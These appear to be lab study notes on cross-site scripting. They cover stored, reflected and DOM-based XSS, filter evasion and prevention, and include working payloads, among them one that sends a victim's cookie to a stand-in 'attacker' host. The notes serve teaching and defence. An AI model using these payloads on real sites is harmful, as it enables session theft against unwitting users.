## CROSS-SITE SCRIPTING

```
IP = 10.10.101.143
```

+ XSS a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.
+ A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.
+ Three types of XSS:
	- Stored XSS
	- Reflected XSS
	- DOM-Based XSS

+ Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised when inserted into the database.  
	- `<script>alert(document.cookie)</script>`
	- `<script> document.getElementById('thm-title').innerHTML = 'I am a hacker';</script>`
	- `<script>window.location='http://attacker/?cookie='+document.cookie</script>`

+ In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
	- `<script>alert('Hello')</script>`
	- `<script>window.location.hostname</script>`

+ In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. An attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with.
	```
	var keyword = document.querySelector('#search')
	keyword.innerHTML = <script>...</script>
	```
	- Payload for an img tag -> `test" onmouseover="alert(document.cookie)"`
	- Change bg color -> `" onmouseover="document.body.style.backgroundColor='red'"`

+ XSS can be used to perform IP and Port scanning.
+ XSS can also be used as to create a keylogger by using javascript to create an event to listen for key-presses.

XSS Filter Evasion
---------------------
+ Bypass script tag filtering by injecting other tags like img.
	- `<img src="test" onerror="alert('Hello')">`
+ Or if alert is blocked use alternatives like confirm.
	- `<img src="test" onerror="confirm('Hello')">`
+ Some other examples to evade filtering:
	- `<img src="test" onerroronerror="alert('HelloHello')">`

Preventing XSS
---------------------
1. Escaping
2. Validating Input
3. Sanitising
